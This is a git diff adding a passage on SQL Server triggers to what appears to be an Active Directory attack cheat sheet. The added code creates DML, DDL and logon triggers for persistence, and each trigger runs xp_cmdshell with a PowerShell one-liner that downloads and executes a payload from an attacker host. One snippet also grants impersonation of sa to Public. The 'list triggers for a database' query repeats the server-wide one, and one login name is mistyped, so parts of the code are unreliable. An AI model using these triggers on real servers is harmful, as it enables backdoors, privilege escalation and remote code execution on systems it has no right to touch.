@@ -78,6 +78,7 @@ it is the first version of this repo, many things will be added later, so stay t
     - [Abusing IPv6 in AD](#abusing-ipv6-in-ad)
       - [Rogue DHCP](#rogue-dhcp) 
       - [IOXIDResolver Interface Enumeration](#ioxidresolver-interface-enumeration)
+    - [References](#references)
 
 
 ## Tools
@@ -917,6 +918,65 @@ CreateObject("ADODB.Connection").Open "Provider=SQLNCLI11;Data Source=DOESNOTEXI
 
 ### DML, DDL and Logon Triggers
 
+[ ❓ ] : **Triggers** are a stored procedure that automatically executes when an event occurs in the SQL Server.
+
+- Data Definition Language (DDL) – Executes on Create, Alter and Drop statements and some system stored procedures. 
+- Data Manipulation Language (DML) – Executes on Insert, Update and Delete statements.
+- Logon Triggers – Executes on a user logon.
+
+**Triggers Listing**
+
+*list All triggers*
+```sql
+SELECT * FROM sys.server_triggers
+```
+*list triggers for a database*
+```sql
+SELECT * FROM sys.server_triggers
+```
+*list DDL and DML triggers on an instance using powershell*
+```powershell
+Get-SQLTriggerDdl -Instance ops-sqlsrvone -username $username -Password 
+$password -Verbose
+Get-SQLTriggerDml -Instance ops-sqlsrvone -username $username -Password 
+$password -Verbose
+```
+
+*use DML triggers for persistence*
+```sql
+USE master
+GRANT IMPERSONATE ON LOGIN::sa to [Public];
+USE testdb
+CREATE TRIGGER [persistence_dml_1]
+ON testdb.dbo.datatable
+FOR INSERT, UPDATE, DELETE AS
+EXECUTE AS LOGIN = 'as'
+EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString('http://$ip_attacker/payload.ps1')"'
+GO
+```
+
+*use DDL triggers for persistence*
+```sql
+CREATE Trigger [persistence_ddl_1]
+ON ALL Server
+FOR DDL_LOGIN_EVENTS 
+AS
+EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString('http://$ip_attacker/payload.ps1')"
+GO
+```
+
+*use Logon triggers for persistence*
+```sql
+CREATE Trigger [persistence_logon_1]
+ON ALL SERVER WITH EXECUTE AS 'sa'
+FOR LOGON
+AS
+BEGIN
+IF ORIGINAL_LOGIN() = 'testuser'
+EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString('http://$ip_attacker/payload.ps1')"
+END;
+```
+
 
 ## Forest Persistence 
 
@@ -1106,3 +1166,13 @@ for bind in binding:
     adr = bind['aNetworkAddr']
     print("Adresse:", adr)
 ```
+
+
+## References 
+
+https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/cloudap
+https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/
+https://www.thehacker.recipes/ad/movement/kerberos/asreproast
+https://www.hackingarticles.in/credential-dumping-ntds-dit/
+https://blog.alsid.eu/dcshadow-explained-4510f52fc19d
+https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
